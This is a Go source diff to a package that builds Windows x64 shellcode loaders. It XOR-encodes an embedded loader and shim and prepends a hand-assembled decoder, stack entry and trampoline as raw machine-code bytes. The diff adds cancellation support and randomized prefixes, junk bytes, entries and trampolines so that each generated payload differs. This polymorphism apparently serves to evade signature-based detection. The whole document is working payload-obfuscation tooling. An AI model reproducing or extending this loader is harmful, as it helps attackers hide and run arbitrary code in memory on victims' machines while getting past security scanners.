@@ -2,6 +2,7 @@ package churro
 
 import (
 	"bytes"
+	"context"
 	"crypto/rand"
 	"encoding/binary"
 	"fmt"
@@ -14,6 +15,17 @@ import (
 // alignment entry, and an in-place decoder. All host-side assembly and patching
 // is Go; the embedded runtime image is the same loader used by Fritter.
 func buildLoader(instance []byte, entropy io.Reader) ([]byte, error) {
+	return buildLoaderWithImages(instance, entropy, nil)
+}
+
+func buildLoaderWithImages(instance []byte, entropy io.Reader, images *LoaderBundle) ([]byte, error) {
+	return buildLoaderWithImagesContext(context.Background(), instance, entropy, images)
+}
+
+func buildLoaderWithImagesContext(ctx context.Context, instance []byte, entropy io.Reader, images *LoaderBundle) ([]byte, error) {
+	if err := ctx.Err(); err != nil {
+		return nil, err
+	}
 	if len(instance) == 0 || len(instance) > int(^uint32(0)>>1) {
 		return nil, fmt.Errorf("invalid instance size %d", len(instance))
 	}
@@ -24,11 +36,25 @@ func buildLoader(instance []byte, entropy io.Reader) ([]byte, error) {
 	if _, err := io.ReadFull(entropy, variant[:]); err != nil {
 		return nil, fmt.Errorf("select loader image: %w", err)
 	}
-	loader := assets.LoaderPEB1
-	if variant[0]&1 != 0 {
-		loader = assets.LoaderPEB2
+	second := variant[0]&1 != 0
+	loader, shim := assets.LoaderPEB1, assets.DispatchShim
+	var meta LoaderMetadata
+	var err error
+	if images != nil {
+		loader, shim, meta = images.PEB1, images.DispatchShim, images.PEB1Meta
+		if second {
+			loader, meta = images.PEB2, images.PEB2Meta
+		}
+	} else {
+		if second {
+			loader = assets.LoaderPEB2
+		}
+		meta, err = embeddedLoaderMetadata(second)
+		if err != nil {
+			return nil, err
+		}
 	}
-	combined, err := prepareCombined(loader, assets.DispatchShim, entropy)
+	combined, err := prepareCombinedWithMetadataContext(ctx, loader, shim, meta, entropy)
 	if err != nil {
 		return nil, err
 	}
@@ -43,38 +69,45 @@ func buildLoader(instance []byte, entropy io.Reader) ([]byte, error) {
 	if _, err := io.ReadFull(entropy, key); err != nil {
 		return nil, fmt.Errorf("generate decoder key: %w", err)
 	}
-	decoder, fixups, err := makeDecoder(uint32(len(combined)), key)
+	decoder, fixups, err := makeDecoder(uint32(len(combined)), key, entropy)
 	if err != nil {
 		return nil, err
 	}
-	if _, err := io.ReadFull(entropy, variant[:]); err != nil {
-		return nil, fmt.Errorf("select prefix size: %w", err)
+	prefix, err := makePrefix(entropy)
+	if err != nil {
+		return nil, err
 	}
-	prefix := bytes.Repeat([]byte{0x90}, int(variant[0]&0x3f))
 
-	// CALL jumps over instance bytes. POP RCX at the target recovers their
-	// address. The RSP frame returns to its own epilogue when the shim returns.
-	entry := make([]byte, 0, 32)
-	entry = append(entry, 0x55, 0x48, 0x89, 0xe5)       // push rbp; mov rbp,rsp
-	entry = append(entry, 0x48, 0x83, 0xe4, 0xf0)       // and rsp,-16
-	entry = append(entry, 0x48, 0x83, 0xec, 0x20)       // sub rsp,32 (shadow space)
-	entry = append(entry, 0xe8, 0x05, 0, 0, 0)          // call over epilogue
-	entry = append(entry, 0x48, 0x89, 0xec, 0x5d, 0xc3) // mov rsp,rbp; pop rbp; ret
-
-	// The trampoline first supplies RDX with the decoded shim address, then
-	// jumps over the page padding. The shim and loader start on page boundaries.
-	tramp := []byte{0x48, 0x8d, 0x15, 0, 0, 0, 0, 0xe9, 0, 0, 0, 0}
-	preBlob := len(prefix) + 5 + len(instance) + 1 + len(entry) + len(decoder) + len(tramp)
+	middle, err := makeJunk(entropy, 7)
+	if err != nil {
+		return nil, err
+	}
+	entry, err := makeStackEntry(entropy)
+	if err != nil {
+		return nil, err
+	}
+	tramp, trampFixups, err := makeTrampoline(entropy)
+	if err != nil {
+		return nil, err
+	}
+	preBlob := len(prefix) + 5 + len(instance) + 1 + len(middle) + len(entry) + len(decoder) + len(tramp)
 	pagePad := (4096 - preBlob%4096) % 4096
 	encodedStart := len(decoder) + len(tramp) + pagePad
 	if err := patchDecoder(decoder, fixups, encodedStart); err != nil {
 		return nil, err
 	}
-	binary.LittleEndian.PutUint32(tramp[3:7], uint32(len(tramp)-7+pagePad))
-	binary.LittleEndian.PutUint32(tramp[8:12], uint32(pagePad))
+	patchTrampoline(tramp, trampFixups, pagePad)
 
 	for i := range combined {
+		if i&4095 == 0 {
+			if err := ctx.Err(); err != nil {
+				return nil, err
+			}
+		}
 		combined[i] ^= key[i&(keyLen-1)]
+	}
+	if err := ctx.Err(); err != nil {
+		return nil, err
 	}
 	result := make([]byte, 0, preBlob+pagePad+len(combined))
 	result = append(result, prefix...)
@@ -82,6 +115,7 @@ func buildLoader(instance []byte, entropy io.Reader) ([]byte, error) {
 	result = binary.LittleEndian.AppendUint32(result, uint32(len(instance)))
 	result = append(result, instance...)
 	result = append(result, 0x59) // pop rcx
+	result = append(result, middle...)
 	result = append(result, entry...)
 	result = append(result, decoder...)
 	result = append(result, tramp...)
@@ -91,6 +125,9 @@ func buildLoader(instance []byte, entropy io.Reader) ([]byte, error) {
 	}
 	result = append(result, pad...)
 	result = append(result, combined...)
+	if err := ctx.Err(); err != nil {
+		return nil, err
+	}
 	return result, nil
 }
 
@@ -98,41 +135,6 @@ type decoderFixups struct {
 	keyDisp, keyEnd   int
 	dataDisp, dataEnd int
 	keyStart          int
-}
-
-func makeDecoder(combinedSize uint32, key []byte) ([]byte, decoderFixups, error) {
-	if len(key) != 4 && len(key) != 8 && len(key) != 16 {
-		return nil, decoderFixups{}, fmt.Errorf("invalid decoder key length %d", len(key))
-	}
-	// Windows x64: RSI=key, RDI=encoded data, ECX=count, BL=key index.
-	// Preserve the nonvolatile registers and the instance pointer in RCX.
-	d := []byte{0x53, 0x56, 0x57, 0x51, 0x48, 0x8d, 0x35, 0, 0, 0, 0}
-	f := decoderFixups{keyDisp: 7, keyEnd: 11}
-	d = append(d, 0x48, 0x8d, 0x3d, 0, 0, 0, 0)
-	f.dataDisp, f.dataEnd = 14, 18
-	d = append(d, 0xb9)
-	d = binary.LittleEndian.AppendUint32(d, combinedSize)
-	d = append(d, 0x31, 0xdb) // xor ebx,ebx
-	loop := len(d)
-	d = append(d,
-		0x8a, 0x04, 0x1e, // mov al,[rsi+rbx]
-		0x30, 0x07, // xor [rdi],al
-		0x48, 0xff, 0xc7, // inc rdi
-		0xfe, 0xc3, // inc bl
-		0x80, 0xe3, byte(len(key)-1), // and bl,key mask
-		0xff, 0xc9, // dec ecx
-		0x75, 0, // jnz loop
-	)
-	jnzNext := len(d)
-	rel := loop - jnzNext
-	if rel < -128 || rel > 127 {
-		return nil, decoderFixups{}, fmt.Errorf("decoder loop exceeds rel8 range")
-	}
-	d[jnzNext-1] = byte(int8(rel))
-	d = append(d, 0x59, 0x5f, 0x5e, 0x5b, 0xeb, byte(len(key))) // restore registers; skip key
-	f.keyStart = len(d)
-	d = append(d, key...)
-	return d, f, nil
 }
 
 func patchDecoder(d []byte, f decoderFixups, encodedStart int) error {
@@ -147,6 +149,13 @@ func patchDecoder(d []byte, f decoderFixups, encodedStart int) error {
 }
 
 func prepareCombined(loaderImage, shimImage []byte, entropy io.Reader) ([]byte, error) {
+	return prepareCombinedContext(context.Background(), loaderImage, shimImage, entropy)
+}
+
+func prepareCombinedContext(ctx context.Context, loaderImage, shimImage []byte, entropy io.Reader) ([]byte, error) {
+	if err := ctx.Err(); err != nil {
+		return nil, err
+	}
 	if len(loaderImage) == 0 || len(shimImage) < 16 {
 		return nil, fmt.Errorf("missing embedded Windows loader")
 	}
@@ -159,6 +168,11 @@ func prepareCombined(loaderImage, shimImage []byte, entropy io.Reader) ([]byte, 
 	copy(combined[shimPadded:], loaderImage)
 	patches := map[uint32]uint32{0xDEAD0001: uint32(shimPadded), 0xDEAD0002: uint32(len(loaderImage))}
 	for i := 0; i+4 <= len(shimImage); i++ {
+		if i&4095 == 0 {
+			if err := ctx.Err(); err != nil {
+				return nil, err
+			}
+		}
 		value := binary.LittleEndian.Uint32(combined[i : i+4])
 		if replacement, ok := patches[value]; ok {
 			binary.LittleEndian.PutUint32(combined[i:i+4], replacement)
@@ -186,10 +200,18 @@ func prepareCombined(loaderImage, shimImage []byte, entropy io.Reader) ([]byte, 
 	combined[ft+25] = 0x02 // shim decrypts whole loader before entry
 	combined[ft+26], combined[ft+27] = 0, 0
 	for i := shimPadded; i < len(combined); i++ {
+		if (i-shimPadded)&4095 == 0 {
+			if err := ctx.Err(); err != nil {
+				return nil, err
+			}
+		}
 		combined[i] ^= fnKey[0]
 	}
 	if _, err := io.ReadFull(entropy, combined[ft:ft+8]); err != nil {
 		return nil, fmt.Errorf("scramble function table marker: %w", err)
+	}
+	if err := ctx.Err(); err != nil {
+		return nil, err
 	}
 	return combined, nil
 }
